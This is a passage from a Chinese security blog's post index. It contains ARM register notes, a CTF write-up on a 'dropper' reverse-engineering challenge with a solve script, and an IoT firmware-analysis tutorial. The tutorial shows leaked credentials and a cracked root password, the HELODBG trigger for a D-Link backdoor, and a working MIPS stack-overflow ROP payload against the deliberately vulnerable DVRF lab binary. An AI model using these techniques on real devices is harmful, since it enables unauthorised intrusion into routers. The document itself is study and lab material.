&#x3D; 1;J&#x3D;0 处理器处于 Thumb 状态 T &#x3D; 1;J&#x3D;1 处理器处于 ThumbEE 状态 控制位 CPSR的低8位(包括I,F,T和M[4:0])称为控制位,当发生异常时这些位可以被改变,如果处理器运行特权模式,这些位也可以由程序修改。 「中断禁止位I,F」【重要】 I&#x3D;1 禁止IRQ中断 F&#x3D;1 禁止FIQ中断 比如我们要想在程序中实现禁止中断，那么就需要将CPSR[7]置1。 运行模式位[4-0] bite 模式 ARM模式可访问的寄存器 注意观察这5个bit的特点，最高位都是1，低4位的值则各不相同，这个很重要，要想搞清楚uboot、linux的源码，尤其是异常操作的代码，必须要知道这几个bit的值。 流水线 关键指令 跳转 伪代码","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[{"name":"arm","slug":"arm","permalink":"http://example.com/tags/arm/"}],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"dropper","slug":"dropper","date":"2022-06-29T01:49:45.000Z","updated":"2022-06-29T15:58:39.854Z","comments":true,"path":"2022/06/29/dropper/","link":"","permalink":"http://example.com/2022/06/29/dropper/","excerpt":"","text":"Dropper 什么是Dropper Dropper是将程序嵌入到自己的内部。 类似于双进程，运行后解密了资源表的数据，本题是一个exe文件，然后作为子进程被创建了 解题 开始一个UPX壳，upx -d 的话无法运行 ，手动去壳,试了很多遍， rax会运行错误。 静态分析： （如果不给题目名称如何看出是dropper技术 进入，上面几个qword是函数调用但是识别失败。最后一个异或0x73，解密资源的地方，接着主程序后面就是创建一个进程，并把刚刚解密出的pe文件手动装载进行内存，然后恢复执行。 下面我们用Process-Dump来dump出子程序 如何使用Process Dump 1pd64.exe -pid **** dump出我们需要的子程序， 主要逻辑为一个int a[500]的数组来实现这个大数的存储及运算 这里的第88行*14 通过交叉引用可以推断出是什么，其初始化在Sub_7FF7D0F21433, 将sub_7FF7D0F2167C的地址赋给前四个字节 sub_7FF7D0F2167C函数主要两个功能，对数值的转换，然后check 对大数的运算 调试提取数据，有一个除0异常，直接跳过即可。 12345678910111213141516171819202122232425262728293031323334import base64enc = [0x000020F1, 0x00001DA9, 0x00000156, 0x00000B37, 0x000007C0, 0x0000066A, 0x000024E0, 0x00000D42, 0x00002077, 0x000007EC, 0x00001BA7, 0x00002071, 0x000000F8, 0x00000291, 0x000003DA, 0x0000157C, 0x00001EF4, 0x00002519, 0x00000C25, 0x00002062, 0x00002253, 0x00000640, 0x000008DF, 0x00001E34, 0x00002140, 0x00000F92, 0x0000039B, 0x0000126F, 0x00002403, 0x00000E65, 0x000001F0, 0x00001868, 0x0000016D, 0x000006B6, 0x00002214, 0x00001603, 0x00001925, 0x000016AE, 0x000012D0, 0x00001831, 0x0000018C, 0x00000BF7, 0x00000E97, 0x000000CE, 0x0000061C, 0x00000390, 0x000019E9, 0x000022A5, 0x00001601, 0x00001A1E, 0x000013D1, 0x00000DBC, 0x0000117D, 0x0000225F, 0x00002272, 0x0000007B, 0x000023E6, 0x0000069F, 0x000002D3, 0x00001BEF, 0x000003E6, 0x000017D4, 0x00002284, 0x000003B8, 0x00000251, 0x00001646, 0x00000176, 0x0000081E, 0x000024C3, 0x00001E85, 0x00001097, 0x00001264, 0x00000A34, 0x00001A3B, 0x00000FE7, 0x000026A6, 0x00001F43, 0x00001832, 0x000021AE, 0x0000023C, 0x000004C2, 0x00002585, 0x000017E7, 0x000015DD, 0x00002610, 0x00001B86, 0x00000D2A, 0x00000716, 0x00001C25, 0x00002099]data = [[0x000024AC, 0x00000116, 0x000004F4, 0x00000B64, 0x00001DC3, 0x00001B4A, 0x000001B2, 0x00001FCE, 0x00000E81, 0x000025AB, 0x0000015B, 0x0000252D, 0x000002AC, 0x00000F77, 0x000022F5, 0x000019E3, 0x00001C53, 0x00000B66, 0x000011BC, 0x0000193A], [0x00000DC6, 0x00000854, 0x000015F5, 0x00002567, 0x000008FA, 0x00000E20, 0x00000807, 0x00001007, 0x000018CC, 0x00001E84, 0x00001F11, 0x000013D4, 0x0000076A, 0x00001461, 0x00000B0F, 0x00001F70, 0x00001B3D, 0x00001008, 0x00000D52, 0x0000049A], [0x00001A89, 0x00000E42, 0x000000FA, 0x0000100D, 0x000014DD, 0x00001BFC, 0x000026DB, 0x00001AC2, 0x00001CA0, 0x000005ED, 0x00000834, 0x000016BF, 0x00000704, 0x00001FAD, 0x000025FD, 0x00001142, 0x00001EEE, 0x00001E60, 0x00000353, 0x000015A8], [0x00000E17, 0x00000706, 0x00000C1F, 0x00000169, 0x00002248, 0x000007FD, 0x00001768, 0x00001F54, 0x00001574, 0x00002458, 0x00000374, 0x00001D6B, 0x00000918, 0x00000ECF, 0x0000211D, 0x00001D96, 0x00001BEB, 0x00001703, 0x00001B87, 0x000006FA], [0x00000AE3, 0x0000069F, 0x000001EF, 0x00001C15, 0x00001378, 0x000020D1, 0x0000211D, 0x00002275, 0x000005F4, 0x00002475, 0x00000D13, 0x000008EF, 0x00000E10, 0x000006D4, 0x0000215A, 0x000004D6, 0x0000202F, 0x00001B99, 0x00001C86, 0x000002F1], [0x00000680, 0x000000D4, 0x00000677, 0x00001E21, 0x0000220D, 0x00000933, 0x00000973, 0x00001947, 0x00000D61, 0x0000247F, 0x00001D21, 0x00001FA2, 0x00001606, 0x000007B0, 0x00001829, 0x000016C0, 0x000026C9, 0x0000248C, 0x00000C9A, 0x00001F8F], [0x0000257F, 0x00000359, 0x00001831, 0x000021B7, 0x00000BA8, 0x00000FC5, 0x00000BA4, 0x000024E2, 0x00001241, 0x00000D53, 0x00000C82, 0x00001240, 0x00002241, 0x00001156, 0x0000116A, 0x000005F3, 0x000022D5, 0x000008DA, 0x000014A3, 0x0000059E], [0x00001675, 0x00000AA9, 0x00000D8B, 0x00000D31, 0x00001722, 0x000006C8, 0x0000151B, 0x000017D8, 0x00001FEF, 0x00001624, 0x00002307, 0x00000CB9, 0x0000053C, 0x00000230, 0x00001EAA, 0x00001FD1, 0x00000FAD, 0x00001E30, 0x00002345, 0x00001583], [0x000001D1, 0x0000056E, 0x00000AA3, 0x0000223C, 0x000009A4, 0x000006C9, 0x00000112, 0x00001977, 0x00002512, 0x00000B60, 0x0000081A, 0x00000F06, 0x00001329, 0x000011AA, 0x00002404, 0x00000E57, 0x0000011E, 0x000011DC, 0x00002474, 0x00001BC7], [0x000022BE, 0x00001F17, 0x00000588, 0x00001B80, 0x00001479, 0x000016EF, 0x000008CA, 0x00000D6E, 0x0000138F, 0x00001054, 0x000021FA, 0x00000102, 0x000013A6, 0x00000195, 0x000002D1, 0x00002594, 0x00001369, 0x00002534, 0x000015C5, 0x0000168A]]enc1 = 0for i in enc[::-1]: enc1 = enc1*10000+idata1= [0]*10for i, val in enumerate(data): #enumerate() 函数用于将一个可遍历的数据对象(如列表、元组或字符串)组合为一个索引序列，同时列出数据和数据下标，一般用在 for 循环当中 for j in val[::-1]: data1[i] = data1[i]*10000+jenc1 += data1[9]enc1 -= data1[8]enc1 += data1[7]enc1 -= data1[6]enc1 += data1[5]enc1 //= data1[4]enc1 -= data1[3]enc1 += data1[2]enc1 //= data1[1]enc1 -= data1[0]ans = &#x27;&#x27;while enc1: ans += chr(enc1%128) enc1 //= 128print(base64.b64decode(ans))","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"-[ACTF] -[dropper]","slug":"ACTF-dropper","permalink":"http://example.com/tags/ACTF-dropper/"}],"keywords":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}]},{"title":"固件分析初试","slug":"固件逆向分析初试","date":"2022-06-24T11:50:10.000Z","updated":"2022-08-08T13:25:00.254Z","comments":true,"path":"2022/06/24/固件逆向分析初试/","link":"","permalink":"http://example.com/2022/06/24/%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%88%9D%E8%AF%95/","excerpt":"","text":"m U-Boot(Universal Boot Loader)，即通用Bootloader，是德国DENX小组开发的用于多种嵌入式CPU的bootloader程序 Legacy-uImage在kernel镜像的基础上，加上64Byte的信息提供给uboot使用 binwalk分析一下，是Squashfs文件系统 Binwalk如何进行提取：通过maigc特征集与文件进行比对，但识别效率比file命令高多了 binwalk -Me 解压得到 文件系统是操作系统的重要组成部分，是操作运行的基础。不同的路由器使用的文件系统格式不尽相同。根文件系统会被打包成当前路由器所使用的文件系统格式，然后组装到固件中。路由器希望文件系统越小越好，所以这些文件系统中各种压缩格式随处可见。 Squashfs是一个只读格式的文件系统，具有超高压缩率，其压缩率最高可达34%。当系统启动后，会将文件系统保存在一个压缩过的文件系统文件中，这个文件可以使用换回的形式挂载并对其中的文件进行访问，当进程需要某些文件时，仅将对应部分的压缩文件解压缩。 Squashfs文件系统常用的压缩格式有GZIP、LZMA、LZO、XZ（LZMA2）。路由器的根文件系统通常会按照Squashfs文件系统常用压缩格式中的一种进行打包，形成一个完整的Squashfs文件系统，然后与路由器操作系统的内核一起形成更新固件。 由于squashFS可以在不需要解压的情况下直接挂载，因此有许多应用场景，例如： 1、安装Linux时用的live cd 2、小型嵌入式设备中的rootfs。rootfs一般以压缩好的形式存放在ROM中，如果开机时把整个rootfs都解压到内存里再读取，对于ROM和RAM容量一般都很小的小型嵌入式设备来说性价比太低。 0x2 静态分析从Dlink固件里面提取样本，打开发现被加密了。 如生成字典用的crunch、rsmangler，爆破用的frackzip等 直接使用教程的密码beUT9Z，解压如下 .mbn：高通的一套用于加载网络环境的文件（modem software configuration） .yaffs2：针对NAND芯片设计的嵌入式文件系统，可用unyaffs提取 核心应该是2K-mdm-image-mdm9625.yaffs2，用unyaffs提取 1unyaffs 2K-mdm-image-mdm9625.yaffs2 yaffs2-root/ 接下来我们查找该路径下的所有.conf文件，.conf文件多是配置文件，有可能从中可以发现敏感的信息。 1find . -name &#x27;*.conf&#x27; 其中的inadyn-mt.conf文件引起了我们注意，这是no-ip应用的配置文件，no-ip就是一个相当于花生壳的东西，可以申请动态域名。我们从中可以发现泄露的no-ip的登陆账号及密码。 我们还从shadow文件中找到了root账号的密码，通过爆破可以得到root的密码为1234。 接下来使用firmwalker来自动化遍历固件系统中的所有可疑文件。 1git clone https://github.com/craigz28/firmwalker.git Firmwalker是一个bash脚本，用于扫描从IoT固件提取的文件以查看它们是否容易受到攻击。唯一的要求是该工具和提取的固件文件应位于同一文件夹中。 将它们放置在相同的位置后，由Firmwalker生成的输出文件-Firmwalker.text-将突出显示潜在问题的列表，可以是以下任意一个： etc &#x2F; ssl目录etc &#x2F; passwd和etc &#x2F; shadow配置，脚本和其他.bin文件关键字，例如远程，管理员，密码等。常见的二进制文件，例如dropbear，tftp和ssh物联网设备上存在的常见Web服务器随机IP地址，电子邮件ID和URL使用Shodan CLI调用Shodan API的实验功能面临任何这些问题的所有物联网设备都容易受到攻击。 1./firmwalker.sh yaffs2-root/ 除了配置文件外，分析存在风险的二进制程序也很重要。查看自启动的程序，在etc&#x2F;init.d目录下存放启动时运行的程序和脚本，一个start_appmgr脚本引起了我们注意，mgr一般就是主控程序的意思。 查看脚本，该脚本会在开机的时候以服务的形式运行&#x2F;bin&#x2F;appmgr程序。 用IDA打开该文件 发现一个后门，这个漏洞被收录到CVE-2016-10178 只要连接该固件的39889端口并发送HELODBG的字符串，就可以进行远程执行命令。 动态调试采用Attify 1./fat.py &#x27;/home/iot/Documents/DWP2360b-firmware-v206-rc018.bin&#x27; 通过192.168.0.50即可访问固件 调试固件用到了Damn Vulnerable Router Firmware这个项目 先用binwalk解压 提取出来的目录里有个文件夹pwnable，里面存放着漏洞程序示例，选取stack_bof_01程序进行实验，程序的源代码可以在DVRF&#x2F;Pwnable Source&#x2F;Intro&#x2F;里查看 先用readelf查看文件信息，mips架构 小端序。。。 文件的主要逻辑：strcpy造成了栈溢出，存在后门函数。 动调拷贝wmu-mipsel-static到固件根目录 1cp (which qemu-mipsel-static) . 用qemu虚拟运行stack_bof_01： 以调试的方式启动程序，并在1234端口进行监听： 1sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 1111 打开一个新的shell，运行以下命令： 1234567gdb-multiarch pwnable/Intro/stack_bof_01# 设置架构set architecture mips#设置调试端口target remote 127.0.0.1:1234 计算偏移v 12345iot@attifyos ~/D/D/F/_/squashfs-root&gt; python2 -c &quot;print &#x27;a&#x27;*204+&#x27;\\x50\\x09\\x40\\x00&#x27;&quot; &gt;payloadiot@attifyos ~/D/D/F/_/squashfs-root&gt; sudo chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01 (cat payload) 如果直接把跳转地址设置为后门函数dat_shell的起始地址0x400950会触发异常 程序成功跳转至dat_shell，但依旧崩溃,因为我们溢出的时候把 $gp 寄存器也覆盖了，$gp 寄存器是用来全局指针寻址用的，覆盖了他就会导致程序无法正常寻址，自然程序就会 crash。 查询MIPS指令集，MIPS跳转方式： 1.设置t9寄存器数值，跳转到t9寄存器； 2.在执行某个函数之前，将要跳转的地址保存在ra寄存器中，执行函数后可跳转。 qemu不能vmmap。 ida打开libc.so.0 在MIPS中，函数内部会通过t9寄存器和gp寄存器来找数据，地址等。同时在mips的手册内默认$t9的值为当前函数的开始地址， 如果在执行00400958 addu $gp, $t9是手动把$t9改成0x00400950，后面就正常了。 所以现在需要找一个gadget，通过t9跳转过去，这也是mips常规的用法，比如main开头调用memet。 sp：MIPS架构中，栈是向下增长的，也就是栈底在高地址，栈顶在低地址。在图3-2中，GPR[sp]代表通用寄存器sp（$29）指向栈顶，又称sp为栈指针（stack pointer） 其偏移0x6b20处确实有一个gadget 12.text:00006B20 00 00 B9 8F lw $t9, arg_0($sp).text:00006B24 09 F8 20 03 jalr $t9 p &amp;memset #查看memset地址，为0x408b6e10。（友情提示，需要在memset处下断点，运行至memset，不然由于之前没有运行memset，memset地址为其got地址） ida打开libc.so.0，查看memset偏移为0x0001BE10 则libc基地址为：0x408b6e10-0x0001BE10&#x3D;0x4089b000 gadget地址为 ：0x4089b000+0x6b20&#x3D;0x408a1b2 payload 12python2 -c &quot;print &#x27;a&#x27;*204+&#x27;\\x20\\x1b\\x8a\\x40&#x27;+&#x27;\\x50\\x09\\x40\\x00&#x27;&quot; &gt; payloadsudo chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01 (cat payload) getshell 修复固件运行环境有一些固件因为硬件依赖等原因导致qemu和firmadyne之类的软件无法正确模拟 模拟固件运行的实质其实就是把固件的Web程序跑起来，而模拟失败则说明Web程序运行出错了，我们接下来就要看看Web程序报错的原因以及如何修复运行环境。 拿到dir605L_FW_113.bin固件 binwalk解析，进入文件系统目录squashfs-root-0，找到web服务程序Boa （在bin目录下 Boa程序是一个轻量级的web服务器程序，常见于嵌入式系统中。dlink就是在boa开源代码的基础上新增了很多功能接口以实现路由器上的不同功能。boa程序的路径为&#x2F;bin&#x2F;boa，同时我们发现在&#x2F;etc&#x2F;boa路径下还有个boa的密码配置文件，我们可以直接获取到boa加密后的密码。 1234567cp (which qemu-mips-static) .sudo chroot . ./qemu-mips-static bin/boa补充mips 是32位大端字节序mipsel 是32位小端字节序 注：APMIB 是个Realtek（网卡？）的玩意 由于没有flash，导致读mib失败 拖到反编译工具中分析。先定位到字符串“Initialize AP MIB failed!”的位置。注意到在输出这个字符串前有个调用APMIB初始化的跳转，在此下断点， IDA gdbserver远程调试 QEMU的远程调试不需要gdbserver，-g 指定端口，ida 远程调试选项指定相应端口就行 1sudo chroot . ./qemu-mips-static -g 23946 bin/boa BNEZ是branch not equal to zero 条件转移指令，当寄存器中内容不为0时转移发生 apmib_init 函数返回 0 导致了这个错误 编写劫持函数动态库： 在apmib.so函数里面。 直接写一个动态库 apmib_init函数返回 1 劫持 123456#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int apmib_init()&#123; return 1;&#125; 编译 1mips-linux-gnu-gcc -Wall -fPIC -shared apmib.c -o apmib-ld.so 然后运行 -E优先选择我们的so文件 1sudo chroot ./ ./qemu-mips-static -E LD_PRELOAD=&quot;./apmib-ld.so&quot; ./bin/boa 但是依旧报错 再次动调发现我们的 apmib_get 函数时出错了 可以将 apmib.so 直接拖出来 IDA32 分析一下 apmib_get 函数 https://jyhshin.pixnet.net/blog/post/47162002-realtek-apmib-libraryapmib_get(), 讀取 RAM 的 mib 值qemu 模拟不了与硬件交互的情况，所以读取不到 重新写 12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define MIB_IP_ADDR 170#define MIB_HW_VER 0x250#define MIB_CAPTCHA 0x2c1int apmib_init()&#123; return 1;&#125;int fork(void)&#123; return 0;&#125;void apmib_get(int code,int *value)&#123; switch(code)&#123; case MIB_HW_VER: *value=0xf1; break; case MIB_IP_ADDR: *value=0x7f000001; break; case MIB_CAPTCHA: *value=1; break; &#125; return;&#125; 再次编译 查看 Wizard_Easy_LangSelect.asp代码，猜测 hw 是 hardware 缩写，所以应该是跟硬件交互 1234var hw_version=&quot;&lt;%getInfo(&quot;hwVersion&quot;)%&gt;&quot;;var productModel=&quot;&lt;%getInfo(&quot;productModel&quot;)%&gt;&quot;;document.getElementById(&quot;hw_version_head&quot;).innerHTML = hw_version;document.getElementById(&quot;product_model_head&quot;).innerHTML 魔改入口网页 first.asp 12345678910111213141516171819202122232425262728&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;% getLangInfo(&quot;LangPathWizard&quot;);%&gt;&lt;script&gt;function init()&#123; var ecflag = &lt;% getIndexInfo(&quot;enableecflag&quot;) %&gt;; if(ecflag == 0) &#123; if((LangCode == &quot;SC&quot;)||(LangCode == &quot;TW&quot;)) &#123; self.location.href=&quot;Basic/Wizard_Easy_Welcome.asp&quot;; &#125; else &#123; //self.location.href=&quot;Basic/Wizard_Easy_LangSelect.asp&quot;; self.location.href=&quot;Basic/Wizard_Easy_Welcome.asp&quot;; &#125; &#125; else &#123; self.location.href=&quot;index.asp&quot;; &#125;&#125;&lt;/script&gt;&lt;body onLoad=&quot;init();&quot;&gt;&lt;/html&gt; 如此便恢复完毕，网页可以访问。 接下来就可以挖洞了哇","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[{"name":"固件分析","slug":"固件分析","permalink":"http://example.com/tags/%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/"}],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"碎碎念","slug":"碎碎念","date":"2022-05-29T16:00:00.000Z","updated":"2022-08-09T13:24:54.875Z","comments":true,"path":"2022/05/30/碎碎念/","link":"","permalink":"http://example.com/2022/05/30/%E7%A2%8E%E7%A2%8E%E5%BF%B5/","excerpt":"有东西被加密了, 请输入密码查看.","text":"38c86067f026f29e39302266fb734fd3a0df356f78b18ae38f6a6454623db8015cd17463d6db1fdc103d032be0181573faba83f3de7fc45eedc25b15be5f5138367a16826ef3b93c6e1dff8ea2e70c4578f4f0dd5d2926d59603dcc031cb5b36eea5b06a6e9e6e0dee79304870ede2b20f85e278cb1ff413bc22f90c46e0e7f029c01e5c38130520e9009ba823811a02cbbfb88de3041c2a17918acaaecd57163b73eddc71f161ffc3e650e2656ba8bed90f753fa82f38ab9d8fd9c5cce01efae038bc55056466dbfc69e18ef9239439db531825e4afc5c1735cc3e1d2f327fbe46d13be2f7fdd9c0b8b83fe6733d9a54f7dcf2983b7ac0529d813e4fec6a842eca2bac830dbdc11412d9532f130cfa1c9dc8e98462205d3c2b97480186f5fd095fa8f4a6a4f6c9a25dd220c19030c1a7b848b05b9ff72c09c7f0d4596ec2876609e19675dbb6d0bb285fa5f56401c94b6d139d3bf7e50d437d9ae1d05899819af7a60411dfb1211cb80b92526176ceabd53259550c1c1b4b2d223fec60d52d48b6708702db4678669a61c4b4878054a581448ab84bb2bb7c16b1371d2e1849710225d3f1acb57d51b72fa39f2fe13ef73baecdc56b1be3231e904d2a927fe7707d5507a3050709c76e760880e724c550fe65d75e429ce77aae6a328d8cc37f6fb0e6a3cde2fd2aa72ca7d937c31a5db4292e8c65f68b15521db5eb0d59e958372a699926481ec56212a8a84b59edbfee2989d19796749c690fb53c12ef7138df76c21398de2a4be965403633153c6b0d880cefabf289c0784627f09e7f1ffa2b6d4216998e69ea1433c0f71fd4877e4480f59a25d48b31842045a6ec8d239930fa674cf6347fea4490fc39c820919016c37bbc7111d31c4962dd140e6a66f8f5cce9424a4e0e44c1602fc7515782f9ca77675715c45f5b84d4fff02d18560fe0e228132a992ff411a0d5458da00380aef85f30b8126fb8e110cf1f2dcfd775f3f2676f258ab04eeba145785fbd38a9af1c5d37db2f99d94b91a7ba72a24fec3592c66a135d0b1a1ed59afe1d475a1ae2f0b70872bf9cd4e0f2c351a437442150f26eea76f1a2cc999ecdc23d2f5a6ffa1cc60473c2612317e6129e994968ecd05a990f97831cf9c219db2ad68e132f7ceb823df09beb3a67a88c9768bcea8cf2a6e26a04de8a1aae6cb954eb57c12f5a5253b87924c38c4ad658b5d9a644e85ee7ebe2f087754edfaa1669752f052b69e7c48a5f195a0614d97f9c741d94bbf4528412555b0b1f8c8d913cde11a0e5b8a01f8b6172dcca1e1215aa390f7f1acb71b061118e5597da73ce7c497473879241d85ccf47bc73eb9cfd6fd044d21fd290622a969c0dc3fd99a19ea33819f5168b88756b19dfee24813b3fb02518c0829db029bd5d399d262e02f8001468263939d0586744d3d13fe35ee7bb19d6918839091f068b9d9f21f1745d100df2e84ecabcdc21c8fbdb7e74b5bee137f32edad7efc23c8603ede09b55e10b6e2ceeaa8565cfadd53ab89b89f5b6256ba9f079121b243907d3ef365dbe44ac0a927b4d5cce5024dcd7722abe4fa3e14db8f02aea0250a734667dd985ce5817312c900daf25389f3a4312a1421e9729846e1f52376d183059f29d86b82e5cd8d65395b3ffb60533e88237f2c3e5e0ef9534ea4616f2e453be6c70680e3d5a2eec09343f4ad91e18761b5fc89054adfe4dd19ae173dc4feb4e9ee994a26f1f9931841394f7bdfb817b91abfc1b83b57d7769189ce1dcefefb57b44349552d79506f480f65a80b0fe26ab81c2ff838d77959e0cd81d1bb8a7986e7cc67255173d20b242d130e52aab4c78a178ce92920c282a230df716c1feef151e988d25292156f00ad483e4da41092609b0df7820b54b53eac6b3058ac1e7e21627f6ce68a016bfb52da8caff7ab9074e1fca6dfa8ac4a6fdaee1385d51b6cfa4b249fe9765f8395a66190108b936bbe00659cd9be8f9caa296548e1d66ff9dda0f71ab8a33c538c38eb3604acd6cdc24c375114bbbf7ae2ae71bf4b683bc52490c0376494d2335c7f70cf7f42b342f059d24157d40a628b52975aace231ece545ab7a898ac7adc6fdd83ead2d246983b102a5db1706a449289e61acfee29f93f03a4482de77bab0343a63d9b86b10a88f100d5d83c6f2def5bd5e7e96893de5418b8cfddf7c2e063414addd273d7ecee72f207566e24c71cea73126d35dd517534748bdb9b7bfd09738155d704941a2b4a7d3514dee7d4ab900dc6804681692635dfe24a8c3eba765ab5ab94bec0b715a1f1153a3bf1c98422ce78577c8fe556459ab5234221ee33ccd9dfe1a5e11c087c3de63cb1151b8e0d0611883d163afac35e8986ff37b3032bad4f5c969055220e64a2b5bdf0bb3ce823837b985f8d7c13a3f3db67150280e15b5a910d9d29844757804cb1c515c507f2d259a2ff1bf59525ddd3ed33c27e54378b5cb08cece4d0e961b2ee5dd3554f831fe2822d025cc51e0a449c442cc365984efef15a0c3c87df60dfc7dea1461b0f7acdc015857eb1f2d74140282b551f35008efab7ed3e84f672710a40422886cd4573d717895400b4640342c4ba0ffffebf0ae8da6f5089bfd34111198c867710f8ac2cc36673cf52db341f02e68af947e9e336d54a2c2cfccccd158f50006cba3daaa0138fd0bbd05ed6c1d188dd12591f7ff4eb69c6c455052b89a551611c687f90d96bca569b4973823bbce717cbfcf84a2d295495792407ecff911ee2e9a4b0233212c87d4b9f63bcb09e81854eaeb76de0453607ea68db32a8aeceabdec5dd8c448cba29b0a4bbc92d5584a941da9dd85459334f1b619a58d792e7d3b76b9ea021f626d03bb06e3cd28aa9c3a253bd76f0047a31c34807cf07dbffffc290ac8fdb668f8c5f7aa3a7b83540f2fa44a27e1ba11fe9f43cb0d91058da00a2f52d6c21102e394ff79abc6526e1197bcd3a41dd6082bc80f83a9409740cb76c9761c8ff7776fdd1bc3bb1e80780152f9c066ff7b36956bc6703d1c85ab16cc5680356d7aa0df7b37b307c2fd59ca597e9b24d97881300321735691f39fb9bc4d37a8103bbb865a0f77ce44fa68d9903ff3b7e15b9047969710b1a7e21900833c06fa6a1bc8d1cf55f1a37e275e5ffb2eea7e4fe2bb80939f8fb01aed00e81829daca640e468bfc46999b5e856fad296965668fc0ea25762cbd3ae9dc4a59b46c05d0a48807e7381b0940f4583fd2165e80aeaf436cfb2cc7486257a0929e5db43717529854f66eb9ca84bbab21deb641eea467048add837f68151a9d04f7657cecc3bf809e6b8595b08ce9eb4a2295db3f62ee6af5f55068836d3a3e40259d6087393c0d90938c3c88d135a700905d9da0449c3f834b3da6060bb7a3ae9adec55aa37223e31907a8ecb7c540b9b6539ed5b28c053a0e27679232cf2c43504b277a7ea6b53a60292e677b269f8501dfd4479c2a774cae7afdcec17741f901656befe82bd5ccff83a38302330a87a56021fb19d4ad4a041d070142937f276c4e152f3c4576dffb41a0bea36677d0f5ea62f0936552f14440bdd8640ac47e772ba182b9104261ede535f7f0038d89c51aea8c205b28f14443e90031244de010d18f47ce754396c1f999380aa71e8dcb1bc23df8c7464a598916bef926866f2501c3ab60b03d13eea44a5fb0a9d9c8bcecefe85ba075df4c9107659ede259a7bc436b4061118e36d5054f6eea63fef493c8fdcda495b093f9226fc8e03f3fa7a37a649cde1980ec86164c007af2a9367e91fd8048e84cc3092ee0f972f6f789a288fce303c4880a31e2c47823538f41a97a8c5fdfe0b2ee36d36e85fd19e80e23a1ea0bded909244ea72e3ee530f4699e4ffddaa022d5e20e4eadb4daad45c5a08641aa13d15a8cfc4e3e27f80a13286cdbb46c6603b78c5ec98d4e6a8b499f2c1480c822ef57372ff01abfa6caa766761985ccd6d9e267c68c20ceaef67a58b19c65a1f7cb39264808d231cf6aeab5824aa8f1c3ebb18542ed6988de38344b465eaa959a6444688061d17367eb615eb92d8df4e0bf948b546015f66bcaa1aa3b9c5fc14ee2f016cf056c28c3a966b4756f81fe4170417c05974ce4811294d927f9953a0e5ab4f6674f2387f02cb9a3597686d22b3aeb478af0383ec89c0ebcd47c9da233ad10df8ef96efdac37b16747d56e9945f1685912e339816b99df0095cb60e0d9095959de84a5bd4caa712881abed2596a0d9bb7e4f82428296582f25ac1c1c5639dfea02358e0a52c323127dca50a9e4a4e694f9e81ff1e8a5d82ba6627e8281c5d39c7b308f8ae5901e5de17db10d2efba87a8797489a01a011ad5f1b52d0b14420a061ab6db56da05e701cbda66cd730679fe9b997650a114562c1e82e96565fc90969316db8b18b45a648e58760b15af56694578450d486e025fd48ca463b68c26b4b455e653d7b529daa71d5ebc245d44ea9a3a793856e531a8e27cee5ffb135800166dc558ad04bbde9db474cd5a2ccd0567caa785d181cc8fbdb73e51a3dcd48b0dc734cd5dca27cb8f38a9ffcb0bf509c49a06e5e0253a9aa1f57a12fcecf85d3e487ccbfc26606efe38e5bb8d811903bb578bba5447f9f174a86d29e0d6b5ce5d74095457e08fb960f8c949019d550b700a045dafefcd61daed0d13ea91666184d84b93188a9f613c3ac07bfc71256dced8d0043ef91e7d0bcd3530800a7e2a2188357da9395569274ad600c9ea295af83354cb0a16af2042f3b7e68910ec64de9dc669a4423f7c2eb4ae0bdb0976f361462fe44794943843cd407482f5c57ae26e45842e7e2f082e6aa5fa76fa075430a844331322eaee021e439d15a1fb839e7f0927f8bbb2e09599d30e93b762e497a7dca8553ce15c6f44e6408063c64472e7a56cd0b1d739c8f879c71d3557e0a873e5327cd25a5343e3385b63b1e0b789fbf7b90405556d6540699f8624af2fc98cbe9de9dcaac9007c0ff70eef48500f1779b84dfe3566ef9a29224c5292f718ef550335af4b77d7f1731c88f02daa8afbdce290a62d63035863713cd1e5f3071c0332feae2b1f11c0cfd801f4644f367f5a2c161b5c4e72ae7a8bd067c147ca9039fe9514d402eb2ad2664049572d42b0f2326b99d65f01beb073decf2e58f9165ea4ebedd558bf2b054ebd76c2a25600889aaf96580a6f45b2a4cd56290f31a1aca7728879a1e924c6c4e28caece3d10c320a0d51213f8291b590964847866f191badea1b78a5e0051e4d04600d74e5dc3ae2b1c22f7af5c0ab2225f3a8aa2b2e7f266b3dbd86a3fc4318cf50a630504d78400b83de88f3ae30780360481b592628d7c5136c174497790265db18eaa9bcd73bbb938e8f44f0864f496f0978c25fe51c656baaf3cb0fc83d8d22d298697ba225e81c49a51d2717f2cf93aef506d04ba0841163e6f82ee7f3f3ad3892a71ffc37c8591eb0e7ed66e6c16fe570c85596a33dd1c9e02b48b3748df231f3e930b64ae6233184d52563ea0f30219d073e851d3e61ce92ee8d6bde1884ba28b690372030847578786302fc327635265cc8030e3349d412cb1116e68d92bef5b7790c4b02290b6ab3dd1ebd7560db6c60f09fc43300d99a1960ae1be383527af6d4eb3d66d98d5b6f51b20a26a3262622cb211ab0ccca273d72f9263713c89e812544eca65d86cb92724b8d34445d4f867ca4996acfa2a98330f91c7667d89e2891c724dd399a3198d0225178e4ca6c3fcd8a9f67d609dc3ae1bd908388dd19e80d01d8fdadf1cb2bb093b98aa59e5f1cf44027e5e05ea6e4d8f2be5e4e98196036fc06ed5072dfa335a83641692d752474824fa43293e06b70b6fa722d8a1871a2d33d367a6e06f5c1319913c0cebf020b7ac23815fbc55a4af9d1ec49e6788cfe0a441950c3ee6ee0826f2a8a3cb58e8071296fe0f52a6850fa9795275894bbb1c6109cb67a5df975bc9daa21637dd77fb475f8dd2b5f2dc83e1d51999e7f16768daf678e0734f897218189d096539457c78b08ab1dee043